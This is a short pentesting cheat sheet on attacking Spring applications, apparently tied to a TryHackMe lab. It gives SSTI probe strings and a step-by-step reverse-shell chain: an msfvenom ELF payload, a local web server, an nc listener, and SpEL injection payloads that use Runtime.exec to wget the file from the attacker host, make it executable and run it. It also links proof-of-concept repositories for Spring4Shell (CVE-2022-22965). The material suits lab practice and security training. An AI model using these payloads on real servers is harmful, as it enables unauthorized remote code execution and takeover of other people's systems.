---
title: Spring Pentesting
description: Spring is an application framework and inversion of control container for the Java platform.
tags:
    - Reverse Shell
    - SSTI
    - Web
refs:
    - https://tryhackme.com/room/spring4shell
date: 2023-01-23
draft: false
---

## Detection

- If we get the **Whitelabel Error Page**, the website uses Spring Boot.

<br />

## Reverse Shell with SSTI

### SSTI Discovery

If there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.

Try them:

```java
2*2
#{2*2}
*{2*2}
```

Then you can also check more about that.

```java
{"dfd".replace("d", "x")}
#{"dfd".replace("d", "x")}
*{"dfd".replace("d", "x")}

// ---------------------------------------

// the desired output of the above...
"xfx"
```

### Reverse Shell

First generate the payload of the reverse shell which will be downloaded from the website.

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<local-ip> LPORT=<local-port> -f elf > r.elf
```

Start a local web server to allow the website to download the payload named “r.elf”

```sh
python3 -m http.server 8000
```

In another terminal, open listener for getting the reverse shell.

```sh
nc -lvnp <local-port>
```

In the target website,

```java
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://<local-ip>:8000/r.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}
```

Finally we should see to get the shell.

<br />

## Spring4Shell (CVE-2022-22965)

Spring4Shell is a vulnerabilitiy to remote code execution in the Spring Framework. It affects a component in Spring Core which is the heart of the framework.

It is identified as a bypass of the patch for CVE-2010-1622.

### Exploits

Vary exploits are available in GitHub repositories.

- [https://github.com/BobTheShoplifter/Spring4Shell-POC](https://github.com/BobTheShoplifter/Spring4Shell-POC)
- [https://github.com/Leovalcante/spring4shell](https://github.com/Leovalcante/spring4shell)
- [https://github.com/me2nuk/CVE-2022-22965](https://github.com/me2nuk/CVE-2022-22965)